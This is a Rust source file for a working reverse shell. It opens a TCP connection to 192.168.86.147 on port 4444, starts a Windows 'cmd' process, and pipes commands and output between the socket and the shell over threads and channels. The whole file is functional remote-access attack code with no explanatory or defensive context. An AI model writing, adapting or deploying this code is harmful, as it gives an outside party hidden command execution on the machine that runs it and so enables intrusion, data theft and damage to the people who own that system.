use std::net::*;
use std::process::*;
use std::io::*;
use std::thread;
use std::thread::*;
use std::sync::mpsc;
use std::sync::mpsc::*;
use std::time::Duration;

fn main() {
    println!("Starting...");

    let mut stream = TcpStream::connect("192.168.86.147:4444").unwrap();
    let mut cloned_stream = stream.try_clone().unwrap();

    println!("Connected to endpoint, starting shell");

    let bash_child = Command::new("cmd")
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .spawn()
        .unwrap();

    println!("Started shell, beginning io loops");

    let mut bash_out = bash_child.stdout.unwrap();
    let mut bash_in = bash_child.stdin.unwrap();

    let (net_tx, net_rx) : (Sender<Vec<u8>>, Receiver<Vec<u8>>) = mpsc::channel();
    let (shell_tx, shell_rx) : (Sender<Vec<u8>>, Receiver<Vec<u8>>) = mpsc::channel();

    let thread_net_read = thread::spawn(move || {

        let mut buffer : [u8; 512] = [0; 512];

        loop {
            println!("Reading from stream");
            
            let count = stream.read(&mut buffer).unwrap();

            if count > 0 {
                println!("read '{}' from socket", count);
                net_tx.send(Vec::from(&buffer[0..count])).unwrap();
            }

            stream.take_error().unwrap();
            //sleep(Duration::from_millis(1000));
        }
    });

    let thread_net_write = thread::spawn(move || {
        loop {
            println!("Writing from stream");

            let data = shell_rx.recv().unwrap();
            println!("Received from shell '{}' bytes", data.len());

            cloned_stream.write(data.as_slice()).unwrap();

            cloned_stream.take_error().unwrap();
            //sleep(Duration::from_millis(1000));
        }
    });

    let thread_shell_read = thread::spawn(move || {

        let mut buffer : [u8; 512] = [0; 512];

        loop {
            println!("Reading from shell");
            
            let count = bash_out.read(&mut buffer).unwrap();
            
            if count > 0 {
                println!("read '{}' bytes from shell", count);
                shell_tx.send(Vec::from(&buffer[0..count])).unwrap();
            }

            //sleep(Duration::from_millis(1000));
        }
    });

    let thread_shell_write = thread::spawn(move || {
        loop {
            println!("Writing to shell");

            let data = net_rx.recv().unwrap();
            println!("read '{}' bytes from socket", data.len());
            bash_in.write(data.as_slice()).unwrap();

            //sleep(Duration::from_millis(1000));
        }
    });

    // Wait for the threads to finish.
    println!("Waiting for threads to finish.");
    thread_net_read.join().unwrap();
    thread_net_write.join().unwrap();
    thread_shell_read.join().unwrap();
    thread_shell_write.join().unwrap();


}
